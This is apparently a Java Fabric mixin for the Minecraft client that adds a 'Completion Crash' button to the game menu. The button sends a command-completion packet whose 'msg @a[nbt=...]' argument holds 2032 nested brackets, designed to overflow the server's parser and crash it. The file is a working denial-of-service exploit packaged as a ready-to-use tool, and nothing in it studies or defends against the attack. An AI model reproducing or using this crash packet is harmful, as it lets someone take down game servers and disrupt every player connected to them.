package com.atg.completion.mixin;

import com.atg.completion.Screens.SettingsScreen;
import net.minecraft.client.RunArgs;
import net.minecraft.client.gui.screen.GameMenuScreen;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TexturedButtonWidget;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.client.MinecraftClient;
import org.spongepowered.asm.mixin.Final;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.Unique;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

@Mixin(GameMenuScreen.class)
public abstract class gameMenuScreenMixin extends Screen {

    @Shadow
    @Final
    private boolean showMenu;
    @Unique
    private final MinecraftClient mc = MinecraftClient.getInstance();

    public gameMenuScreenMixin(RunArgs.Game screenHandler, Text text) {
        super(text);
    }

    @Inject(method = "init", at = @At("TAIL"))
    protected void init(CallbackInfo ci) {
        addDrawableChild(new ButtonWidget.Builder(Text.literal("Completion Crash"), this::SendCrashPackets)
            .position(5, 5)
            .size(100, 20)
            .build()
        );

        addDrawableChild(new TexturedButtonWidget.Builder(Text.literal("settings"), this::OpenSettingsMenu)
            .position(110, 5)
            .size(50, 20)
            .build()
        );
    }


    private int length = 2032;

    String overflow = generateJsonObject(length);
    String message = "msg @a[nbt={PAYLOAD}]";
    String partialCommand = message.replace("{PAYLOAD}", overflow);

    @Unique
    private void SendCrashPackets(ButtonWidget button) {
        MinecraftClient.getInstance().player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        System.out.println("SendCrashPackets Works");
    }

    @Unique
    private void OpenSettingsMenu(ButtonWidget button) {
        mc.setScreen(new SettingsScreen(this));
    }

    private String generateJsonObject(int levels) {
        String in = IntStream.range(0, levels)
            .mapToObj(i -> "[")
            .collect(Collectors.joining());
            System.out.println("generateJsonObject works");
        return "{a:" + in + "}";

    }

    public void main() {
    }
}

